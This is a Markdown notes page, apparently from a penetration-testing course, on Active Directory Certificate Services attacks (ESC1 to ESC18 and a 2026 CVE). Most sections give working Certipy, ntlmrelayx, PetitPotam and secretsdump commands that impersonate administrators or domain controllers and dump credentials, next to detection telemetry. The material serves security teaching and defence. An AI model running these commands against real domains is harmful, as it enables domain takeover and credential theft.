+++
title = 'ADCS Attacks'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['active-directory', 'adcs', 'certificates']
+++

Active Directory Certificate Services (ADCS) issues certificates that can be used for **Kerberos PKINIT authentication**. A misconfigured template or CA lets a low-privileged user obtain a certificate **as another user** — often a Domain Admin or a domain controller — and authenticate with it, no password cracking required. Certificate-based auth survives password resets, and it is frequently out of scope for MFA and Conditional Access policies, which is why AD CS paths are disproportionately valuable for persistence as well as escalation.

As of mid-2026, **17 ESC scenarios are formally recognised (ESC1–ESC17)**, with an 18th variant tracked in current offensive literature. Certipy’s `find -vulnerable` labels each finding with its ESC number; this page covers the variants that matter operationally and the workflow around them.

> **Tooling:** Certipy (Linux, `pip install certipy-ad`) — **v5+ for ESC17 support**; Certify (Windows, GhostPack). Both enumerate and abuse the same misconfigurations. Run `certipy find -vulnerable` first.

---

## 1. Enumeration

```bash
# Find vulnerable templates/CAs (requires valid domain credentials)
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Include all templates, not just vulnerable ones
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -stdout

# With a hash instead of a password
certipy find -u <user>@<domain> -hashes :<ntlm> -dc-ip <dc-ip> -vulnerable

# Show only enabled templates (useful when -template fails later)
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -enabled
```

**Windows equivalent:**

```powershell
.\Certify.exe find /vulnerable
.\Certify.exe find /ca
```

**What to record:**

- **CA name and host** — `corp-CA`, `ca.domain.local`. `certipy req` needs the **CA name**, not the host.
- **Template name** and the specific ESC condition.
- Whether the CA exposes **Web Enrollment** (`http://<ca>/certsrv/`) or **ICPR** — the precondition for ESC8 and ESC11.
- Whether the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set (ESC6).
- Whether templates are **schema v1** (ESC15 precondition).

> **Detection note for defenders:** enumeration over LDAPS looks like normal TLS traffic. What distinguishes Certipy is the **behavioural pattern** — rapid, structured `searchRequest` sequences filtering on `pKICertificateTemplate`, `msPKI-Certificate-Name-Flag`, and `pkiExtendedKeyUsage`.

---

## 2. ESC1 — Enrollee Supplies Subject (Client Authentication)

The template allows low-privileged users to enroll, has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set, and has a **client-authentication EKU** (`Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, or `Any Purpose`). No manager approval or authorized signatures are required.

```bash
certipy req -u <user>@<domain> -p '<password>' -ca <CA-NAME> -template <TEMPLATE> \
  -upn administrator@<domain> -dc-ip <dc-ip>

# Output: administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

`certipy auth` performs PKINIT and prints the **TGT and the account’s NT hash** (UnPAC-the-hash). If PKINIT is unavailable, use `-ldap-shell` (Schannel/LDAP) or `passthecert.py`.

**Telemetry:** CA Event **4887** with a SAN in `CertificateAttributes`; DC Event **4768** with `PreAuthType 16` (PKINIT) from an unexpected client. CA audit logging is off by default — many environments have never run `certutil -setreg ca\AuditFilter 127`.

---

## 3. ESC2 — Any Purpose / No EKU

The template has **Any Purpose** (`2.5.29.37.0`) or **no EKU at all**, and low-privileged users can enroll. The certificate can be used for client authentication **or as an enrollment agent**, making it an ESC3 pivot.

```bash
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template <TEMPLATE>
certipy auth -pfx <user>.pfx -dc-ip <dc-ip>
```

---

## 4. ESC3 — Certificate Request Agent

A template grants the **Certificate Request Agent** EKU to low-privileged users. Use the agent certificate to request a certificate **on behalf of another user** (the “on-behalf-of” primitive).

```bash
# 1. Get the agent certificate
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template <AGENT-TEMPLATE>

# 2. Request a certificate for the target user, signed by the agent cert
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template User \
  -on-behalf-of '<domain>\administrator' -pfx <user>.pfx

# 3. Authenticate
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

**Telemetry:** **4886** with the `raDN` field set (the on-behalf-of indicator), paired with **4887** for the issued certificate.

---

## 5. ESC4 — Writable Template ACL

You have `GenericWrite`, `GenericAll`, `WriteDACL`, or `WriteOwner` on a certificate template object. Modify the template into an **ESC1-style** template, exploit it, then **restore the original configuration**.

```bash
# Save the original configuration, then apply a vulnerable configuration
certipy template -u <user>@<domain> -p '<password>' -template <TEMPLATE> \
  -write-default-configuration -dc-ip <dc-ip> -save-old

# Request as administrator
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template <TEMPLATE> \
  -upn administrator@<domain> -dc-ip <dc-ip>

# Restore the original template
certipy template -u <user>@<domain> -p '<password>' -template <TEMPLATE> \
  -configuration <TEMPLATE>.json -dc-ip <dc-ip>
```

> **Detection challenge:** the attack is **transient** — the flag is added, the cert enrolled, then the flag removed. Without **Event ID 5136** auditing on template objects, the modification window may be too brief to catch.

---

## 6. ESC5 — Writable PKI Objects

Write access to the **CA server object**, the `NTAuthCertificates` object, or the enrollment service object. This is environment-specific: you may be able to add a rogue CA certificate or modify the CA’s security. Enumerate with BloodHound (`ADCS` edges) and `certipy find`; exploitation usually means adding a certificate to `NTAuthCertificates` or taking over the CA object.

---

## 7. ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2`

The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, so **any** template request can include a SAN — the template itself does not need `ENROLLEE_SUPPLIES_SUBJECT`. Request a normal template with an administrator UPN:

```bash
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template User \
  -upn administrator@<domain> -dc-ip <dc-ip>
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

Check on the CA with `certutil -getreg policy\EditFlags`; `certipy find` also flags ESC6.

---

## 8. ESC7 — CA Officer / ManageCA

You have `ManageCA` or `Officer` rights on the CA:

```bash
# Add yourself as an officer (requires ManageCA)
certipy ca -u <user>@<domain> -p '<password>' -ca <CA> -add-officer <user> -dc-ip <dc-ip>

# Enable a disabled template (requires ManageCA)
certipy ca -u <user>@<domain> -p '<password>' -ca <CA> -enable-template <TEMPLATE> -dc-ip <dc-ip>

# As officer, approve a failed request (requires Officer + request ID)
certipy ca -u <user>@<domain> -p '<password>' -ca <CA> -issue-request <REQUEST-ID> -dc-ip <dc-ip>
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template <TEMPLATE> -retrieve <REQUEST-ID>
```

---

## 9. ESC8 — NTLM Relay to HTTP Enrollment

The CA exposes an **HTTP enrollment endpoint** (Web Enrollment `/certsrv/`, or ICPR) that accepts NTLM and is not protected against relaying. Relay a **domain controller’s machine account** to it and request a certificate for `DC01$`; then use PKINIT to get a TGT and DCSync.

```bash
# 1. Start the relay against the CA's enrollment endpoint
sudo ntlmrelayx.py -t http://<CA-HOST>/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# 2. Coerce the DC to authenticate to you (run after the relay is listening)
python3 PetitPotam.py <attacker-ip> <dc-ip>
# or printerbug.py / dfscoerce.py

# 3. ntlmrelayx prints a base64 PFX; save it and authenticate
certipy auth -pfx dc01.pfx -dc-ip <dc-ip>
# or with PKINITtools:
python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' '<domain>/DC01$' dc01.ccache
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass <dc-fqdn>
```

**Prerequisites:** the endpoint must be reachable, **NTLM must be allowed** (not Negotiate-only with Extended Protection), and the `DomainController` template must be available. If Web Enrollment is absent, look for **ICPR (ESC11)** or use LDAP relay + ESC7/ESC4 instead.

---

## 10. ESC9 — No Security Extension

The template has `CT_FLAG_NO_SECURITY_EXTENSION`, which suppresses the `szOID_NTDS_CA_SECURITY_EXT` SID binding. Combined with weak certificate mapping, you can change the victim’s `userPrincipalName`, request a certificate, then change it back — the certificate maps to the privileged account.

---

## 11. ESC10 — Weak Certificate Mapping

Weak `StrongCertificateBindingEnforcement` or `CertificateMappingMethods` on the DC. Spoof a UPN or use **S4U2Self** so the issued certificate maps to a privileged account. ESC9 and ESC10 are the “UPN vs SAN mapping” pair.

---

## 12. ESC11 — ICPR over RPC

Relay to **ICPR over RPC** (the ICertPassage interface). No NTLM relay protection by default — the RPC counterpart to ESC8. Use `ntlmrelayx.py` with the `--icpr` target instead of HTTP enrollment.

---

## 13. ESC13 — Issuance Policy Linked to a Group

The template has an **issuance policy OID** linked to a group. The certificate grants that group’s access — including, potentially, Domain Admin. Check `msPKI-Certificate-Policy` on the template and the linked group in AD.

---

## 14. ESC14 — Weak Explicit Mapping (`altSecurityIdentities`)

Users and computers can have **explicit certificate-to-account mappings** in the `altSecurityIdentities` LDAP attribute. If a mapping is weak — for example, it matches on a `Subject` DN that an attacker can control via an ESC1-style template — an attacker can forge a certificate that satisfies the mapping and authenticate as the mapped account.

```bash
# Enumerate explicit mappings
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -stdout | grep -i altSecurityIdentities
```

Exploitation depends on the **mapping type**: `X509IssuerSubject` and `X509SubjectOnly` are the weakest, because both components can be attacker-supplied through a template that allows `ENROLLEE_SUPPLIES_SUBJECT`. Combine ESC14 with an ESC1-style template to produce a certificate whose Subject DN matches the mapping, then authenticate.

---

## 15. ESC15 — EKUwu (Application Policy Injection), CVE-2024-49019

**Schema version 1 templates** allow the requester to supply arbitrary **Application Policy** extensions — in effect, an attacker-chosen EKU. The default `WebServer` template is the canonical target: it is enabled by default, allows a user-supplied SAN, and has only the **Server Authentication** EKU. By injecting a **Client Authentication** EKU through the application policy, the attacker turns it into a client-auth certificate and requests it as an administrator.

```bash
# Request a certificate from a schema v1 template, injecting Client Authentication
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template WebServer \
  -upn administrator@<domain> -application-policies 'Client Authentication' -dc-ip <dc-ip>

certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

**Patch status:** fixed by Microsoft in **November 2024** (CVE-2024-49019). It remains relevant on **unpatched CAs** and is the highest-impact single-template finding in many environments — the original research found it in roughly **80% of tested environments**.

> **Certipy note:** ESC15 support requires a Certipy build with the `-application-policies` flag (upstream PR #228, now merged). Check `certipy req -h` on the installed version.

---

## 16. ESC16 — Security Extension Disabled Globally

The CA has the **security extension disabled globally** (`szOID_NTDS_CA_SECURITY_EXT` is not added to issued certificates). This removes the SID binding from every certificate the CA issues, weakening certificate-to-account mapping across the board and enabling ESC9-style UPN spoofing without the per-template `CT_FLAG_NO_SECURITY_EXTENSION` flag.

`certipy find` flags this as **ESC16**. Exploitation follows the same pattern as ESC9: change the victim’s UPN, request a certificate from any client-auth template, change the UPN back, authenticate.

---

## 17. ESC17 — Enrollee-Supplied Subject for **Server** Authentication

**ESC17 is the 2026 addition** and the one most often missed because it does not look like privilege escalation at first glance. It is structurally identical to ESC1 — a template with `ENROLLEE_SUPPLIES_SUBJECT` and permissive enrollment — except the template’s EKU is **Server Authentication**, not Client Authentication.

### Why it matters

A Server Authentication certificate lets you **impersonate a server** over TLS. With a SAN you control, you can stand up a rogue TLS endpoint that presents a certificate signed by the **corporate CA** — trusted by every domain-joined client. This enables:

- **TLS MITM** against internal services (WSUS, Exchange, LDAP/S, RDP).
- **Credential capture** from clients that connect to the spoofed service.
- **Relay and coercion chains** that begin with a trusted server identity rather than a client one.

ESC17 is the server-side mirror of ESC1: ESC1 lets you *be* a user; ESC17 lets you *be* a server. The 2026 research pairs it with **WSUS** in particular — a rogue WSUS server presenting a CA-signed Server Authentication certificate can deliver “updates” to clients that trust the CA.

### Enumeration and exploitation

```bash
# Certipy v5+ flags ESC17
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Request a certificate with a server SAN you control
certipy req -u <user>@<domain> -p '<password>' -ca <CA> -template <TEMPLATE> \
  -dns <server-fqdn> -dc-ip <dc-ip>
```

> **Note:** Certipy v5+ is required for ESC17 detection and exploitation. On older versions, the finding appears as an unclassified `ENROLLEE_SUPPLIES_SUBJECT` template and must be triaged manually.

---

## 18. ESC18 — Emerging / Book-Level Taxonomy

Current offensive literature (**Forged Trust**, 2026) documents an **ESC18** class alongside ESC1–ESC17. At the time of writing it is not yet a distinct Certipy finding on all builds, and its precise root cause is still being consolidated across research. Treat it as a **watch item**: if `certipy find` flags a template or CA setting you do not recognise as ESC1–ESC17, consult the current SpecterOps taxonomy rather than assuming it is benign.

---

## 19. Certighost — CVE-2026-54121 (Domain Controller Impersonation)

**Certighost** is a **CA-level fallback-enrollment flaw**, not an ESC-class template misconfiguration. It allows a **low-privileged domain user** to obtain a certificate for a **legitimate Domain Controller** and authenticate as that machine — a direct path to DCSync and domain compromise.

| Property | Detail |
|---|---|
| **CVE** | CVE-2026-54121 |
| **CVSS** | 8.8 |
| **Affected** | Windows Server 2012 – Server 2025 (including Server Core); Windows 10 1607 / 1809 |
| **Prerequisite** | Network access + **any domain account** |
| **Patched** | July 2026 Patch Tuesday |
| **Public PoC** | Released July 2026 |

### Why it is distinct from ESC8

ESC8 is an **NTLM relay** to an HTTP enrollment endpoint — you need to coerce a DC to authenticate and relay its machine account. Certighost is a **fallback enrollment** flaw: the attacker requests a DC certificate **directly**, without coercion and without relay, using only a standard domain account. That makes it far quieter and removes the network-positioning requirements of ESC8.

### Exploitation sketch

```bash
# After the CA is identified (patched CAs will reject this)
certipy req -u <user>@<domain> -p '<password>' -ca <CA> \
  -template DomainController -dc-ip <dc-ip>

# Authenticate as the DC machine account
certipy auth -pfx dc01.pfx -dc-ip <dc-ip>
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass <dc-fqdn>
```

> **Check patch level first.** On a patched CA, the fallback enrollment path is closed. `certipy find` may not label it — check the CA’s build against the July 2026 KB before spending time.

---

## 20. ESC Summary Table (2026)

| ESC | Root cause | Primary primitive | Certipy flag |
|---|---|---|---|
| **ESC1** | `ENROLLEE_SUPPLIES_SUBJECT` + client-auth EKU | Impersonate any user | Yes |
| **ESC2** | Any Purpose / no EKU | Client auth or enrollment agent | Yes |
| **ESC3** | Certificate Request Agent EKU | On-behalf-of enrollment | Yes |
| **ESC4** | Writable template ACL | Modify to ESC1 → exploit → restore | Yes |
| **ESC5** | Writable PKI objects | Rogue CA / NTAuth modification | Partial |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN on any template | Yes |
| **ESC7** | `ManageCA` / Officer rights | Approve requests, enable templates | Yes |
| **ESC8** | NTLM relay to HTTP enrollment | DC machine cert → DCSync | Yes |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` | UPN spoof + weak mapping | Yes |
| **ESC10** | Weak `StrongCertificateBindingEnforcement` | UPN/SAN mapping abuse | Yes |
| **ESC11** | ICPR over RPC | RPC relay to CA | Yes |
| **ESC13** | Issuance policy linked to group | Certificate grants group access | Yes |
| **ESC14** | Weak `altSecurityIdentities` mapping | Forge cert matching explicit mapping | Partial |
| **ESC15** | Schema v1 + app-policy injection (CVE-2024-49019) | EKU smuggling (EKUwu) | Yes (PR #228) |
| **ESC16** | Security extension disabled globally | CA-wide UPN spoof | Yes |
| **ESC17** | `ENROLLEE_SUPPLIES_SUBJECT` + **Server Auth** EKU | TLS MITM / rogue server | Certipy v5+ |
| **ESC18** | Emerging (book-level taxonomy) | TBD | Watch item |
| **Certighost** | CA fallback enrollment (CVE-2026-54121) | Request DC cert directly | Check patch |

---

## 21. After You Have a Certificate

- `certipy auth -pfx <file>.pfx -dc-ip <dc>` → **TGT + NT hash** (PKINIT / UnPAC-the-hash).
- If PKINIT is blocked: `certipy auth -pfx <file>.pfx -dc-ip <dc> -ldap-shell` (Schannel LDAP shell), or `passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <domain> -dc-ip <dc>`.
- Use the TGT normally: `export KRB5CCNAME=...`, `impacket-secretsdump -k -no-pass`, `impacket-psexec -k -no-pass`, `nxc smb <dc> -k --use-kcache`.
- A certificate for a **machine account** can also be used for **RBCD** or **unconstrained delegation** follow-ups.
- **ESC17 certificates** are used differently: stand up a TLS service with the certificate, then coerce or wait for clients to connect — capture credentials or relay.

---

## 22. Pitfalls

- **Clock skew** breaks PKINIT — sync with the DC.
- `certipy req` needs the **CA name**, not the host. `certipy find` prints `CA Name : CORP-CA`.
- PFX files may be password-protected; `certipy auth` prompts or accepts `-pfx-pass`.
- ESC1 requires the template to be **enabled** and **published**. If `-template` fails, check `certipy find -enabled`.
- **Do not modify templates you do not need to.** ESC4 changes are logged and break the environment for other students. Use `-save-old` and restore.
- **Certipy versions differ in flags** — `req` vs `request`, `-upn` vs `-san`, `-application-policies` for ESC15. Check `certipy req -h` on the installed version.
- **ESC17 needs Certipy v5+.** On older versions the finding is unclassified and easy to overlook.
- **Certighost is a patch-level check, not a template check.** `certipy find` may not label it — verify the CA build against the July 2026 KB.
- **ESC18 is not yet a stable Certipy finding.** If a flagged template does not match ESC1–ESC17, consult the current SpecterOps taxonomy before assuming it is benign.

---

## 23. Detection Quick Reference

| Attack | Primary telemetry |
|---|---|
| **Enumeration** | LDAPS `searchRequest` on `pKICertificateTemplate`; behavioural pattern (volume, timing) |
| **ESC1 / ESC17** | CA **4887** with SAN in `CertificateAttributes`; DC **4768** `PreAuthType 16` |
| **ESC3** | **4886** with `raDN` set; requester ≠ subject in subsequent **4887** |
| **ESC4** | **5136** on `pKICertificateTemplate`; transient attribute change |
| **ESC8 / ESC11** | NTLM authentication to CA enrollment endpoint from an unexpected source |
| **ESC15** | Certificate with requester-supplied Application Policy on a schema v1 template |
| **Certighost** | DC certificate requested by a non-machine, low-privileged account |

---

This file sits alongside the **Built-in Groups Abuse** and **Excessive User Rights Abuse** notes: an AD CS misconfiguration is often the **fastest domain-wide escalation** available to a low-privileged domain user, and it survives password resets — which makes it as valuable for persistence as for the initial escalation.
